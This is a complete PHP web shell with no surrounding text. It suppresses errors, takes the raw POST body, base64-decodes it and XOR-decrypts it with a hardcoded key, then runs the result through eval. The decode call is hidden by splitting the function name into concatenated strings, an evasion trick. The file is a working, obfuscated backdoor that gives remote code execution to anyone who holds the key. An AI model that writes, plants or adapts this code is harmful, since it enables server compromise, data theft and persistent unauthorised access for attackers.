<?php
@error_reporting(0);
function Decrypt($data)
{
    $orange="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$orange[$i+1&15]; 
    }
    return $after;
}
$post=Decrypt(file_get_contents("php://input"));
@eval($post);
?>